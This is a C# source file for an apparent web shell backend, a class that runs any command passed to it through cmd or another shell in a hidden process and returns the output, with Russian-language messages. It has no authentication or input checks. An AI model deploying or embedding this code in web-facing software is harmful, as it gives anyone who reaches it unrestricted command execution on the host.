using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Threading.Tasks;

namespace WebShell.ShellScripts
{
    public class ApparatShell
    {
        private string path = Environment.GetFolderPath(Environment.SpecialFolder.MyComputer);
        private Process si = new Process();
        public ApparatShell()
        {

        }

        private string commanCommand(string command,string shell)
        {
            string output = "";
            string error = "";
            if (shell == "cmd")
            {
                if (command.Split(' ')[0] != "/c")
                    command = command.Insert(0, "/c ");
            }
            try
            {
                si.StartInfo.WorkingDirectory = path;
                si.StartInfo.UseShellExecute = false;
                si.StartInfo.FileName = shell;
                si.StartInfo.Arguments = command;
                si.StartInfo.CreateNoWindow = true;
                si.StartInfo.RedirectStandardInput = true;
                si.StartInfo.RedirectStandardOutput = true;
                si.StartInfo.RedirectStandardError = true;
                si.Start();
                output = si.StandardOutput.ReadToEnd();
                error = si.StandardError.ReadToEnd();
                si.Close();
                if (error.Length > 0)
                {
                    return error;
                }
                else
                {
                    return output;
                }
            }
            catch(Exception ex)
            {
                return ex.Message;
            }
        }

        private string cdCommnad(string command)
        {
            command = command.Replace("/c", "");
            command = command.Trim();
            string[] commandParts = command.Split(' ');

            if (commandParts.Length != 2)
                return "Команда введена не правильно. Введите help cd или webhelp чтобы посмотреть справку";

            for (int i=0; i<commandParts.Length;i++)
            {
                if(commandParts[i] == "cd")
                {
                    path = commandParts[i + 1];
                }
            }

            return $"Рабочая директория изменена на '{path}'";
        }

        public string Request(string command,string shell)
        {
            if (shell == "cmd")
            {
                if (command.Split(' ')[0] != "/c")
                    command = command.Insert(0, "/c ");

                if (command.Split(' ')[1] == "cd")
                    return cdCommnad(command);


            }
            else
            {
                if (command.Split(' ')[0] == "cd")
                    return cdCommnad(command);
            }

                return commanCommand(command, shell);

        }
    }
}
